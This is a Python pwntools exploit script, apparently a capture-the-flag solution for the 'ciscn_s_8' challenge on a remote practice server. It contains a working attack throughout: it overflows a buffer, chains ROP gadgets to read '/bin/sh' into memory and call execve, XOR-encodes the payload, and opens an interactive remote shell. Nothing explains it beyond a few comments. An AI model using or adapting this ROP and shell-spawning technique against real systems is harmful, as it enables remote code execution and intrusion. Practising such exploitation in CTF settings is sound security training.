from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('ciscn_s_8')
io = remote('node4.buuoj.cn', 29985)
# libc = ELF('/mnt/hgfs/payoung/Documents/ctf/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so')
# libc = ELF('libc-2.29.so')
elf = ELF('ciscn_s_8')
pop_rax_ret = 0x0000000000449b9c
pop_rdi_ret = 0x00000000004006e6
pop_rdx_rsi_ret = 0x000000000044c179
syscall = 0x000000000040139c
buf = 0x00000000006bc300
read = 0x0000000000449be0

payload = b'a' * 0x50
# read(0, buf, 8) 
payload += p64(pop_rdi_ret) + p64(0) + p64(pop_rdx_rsi_ret) + p64(8) + p64(buf) + p64(read)
# execve(buf, 0, 0)
payload += p64(pop_rax_ret) + p64(59) + p64(pop_rdi_ret) + p64(buf) + p64(pop_rdx_rsi_ret) + p64(0) * 2 + p64(syscall)

payload_xor = b''
for p in payload:
    payload_xor += p8(p ^ 0x66)

# gdb.attach(io)
# pause()
io.sendlineafter('Please enter your Password: ', payload_xor)
io.send('/bin/sh\x00')
io.interactive()
